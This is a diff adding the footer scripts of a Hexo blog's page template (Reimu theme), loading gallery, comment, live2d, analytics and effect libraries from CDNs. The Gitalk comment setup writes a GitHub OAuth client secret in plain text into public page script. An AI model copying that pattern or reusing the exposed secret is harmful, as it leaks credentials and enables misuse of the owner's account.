+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/gitalk/dist/gitalk.min.js" data-pjax></script>
+
+  
+  <script data-pjax>
+    var gitalkId = location.pathname;
+    var gitalk = new Gitalk({
+      clientID: '0efb4a442bc09d1ba17e',
+      clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
+      repo: 'https://github.com/Yyjccc/yyjccc.github.io.git',
+      owner: 'Yyjccc',
+      admin: "Yyjccc",
+      id: gitalkId, // Ensure uniqueness and length less than 50
+      distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    if (document.getElementById('comments')) {
+      gitalk.render('comments')
+    }
+  </script>
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.0-alpha.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script></body>
+  </html>
+
